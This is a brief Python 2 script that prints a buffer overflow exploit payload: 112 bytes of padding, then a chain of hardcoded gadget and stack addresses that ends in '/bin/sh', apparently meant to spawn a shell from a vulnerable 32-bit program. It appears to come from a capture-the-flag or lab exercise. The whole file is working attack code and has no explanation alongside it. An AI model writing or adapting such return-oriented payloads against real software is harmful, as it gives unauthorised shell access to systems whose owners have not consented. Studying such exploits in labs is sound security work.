from struct import pack

print "a"*112 +\
	pack("<I", 0x08051750)+\
	pack("<I", 0x0805733A)+\
	pack("<I", 0xBFFE7DD4)+\
	pack("<I", 0x080497D2)+\
	pack("<I", 0x08057361)+\
	pack("<I", 0xBFFE7DE8)+\
	pack("<I", 0xBFFE7DF0)+\
	pack("<I", 0x08051750)+\
	pack("<I", 0x0807C3E2)+\
	"a"*4+\
	pack("<I", 0x0805733A)+\
	pack("<I", 0xBFFE7DEC)+\
	pack("<I", 0x08057433)+\
	"a"*8+\
	pack("<I", 0xBFFE7DF0)+\
	"A"*4+\
	"/bin/sh"+"\x00"
	
